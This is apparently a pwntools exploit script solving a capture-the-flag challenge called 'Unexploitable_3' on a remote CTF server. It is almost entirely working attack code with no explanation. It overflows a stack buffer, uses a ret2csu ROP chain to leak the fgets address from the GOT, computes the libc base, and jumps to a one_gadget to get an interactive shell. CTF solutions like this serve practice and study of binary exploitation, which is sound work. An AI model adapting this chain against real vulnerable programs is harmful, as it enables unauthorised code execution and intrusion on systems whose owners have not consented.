#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./Unexploitable_3")
p = remote("ctf.j0n9hyun.xyz", 3034)
elf = ELF("./Unexploitable_3")
libc = elf.libc 
p1ret = 0x400743
writable = 0x601070
mov_rcx_rdi = 0x00400658
stdout = 0x601050

rbx = 0
rbp = 1
r12 = elf.got['fwrite']
r13 = 0x1
r14 = 0x6
r15 = elf.got['fgets']
ret = 0x400720 # csu1
offset = 8*7
main = elf.symbols['main']

pay = 'A'*(0x10+0x8) + p64(p1ret) + p64(stdout) + p64(mov_rcx_rdi)
pay += p64(0x40073a) # csu2
pay += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
pay += 'A'*offset + p64(main)

p.sendlineafter("\n", pay)

fgets = u64(p.recv(6) + "\x00\x00")
libcBase = fgets - libc.symbols['fgets']
one_gadget = libcBase + 0x45216

p.sendlineafter("\n", 'A'*(0x10+0x8) + p64(one_gadget))

p.interactive()
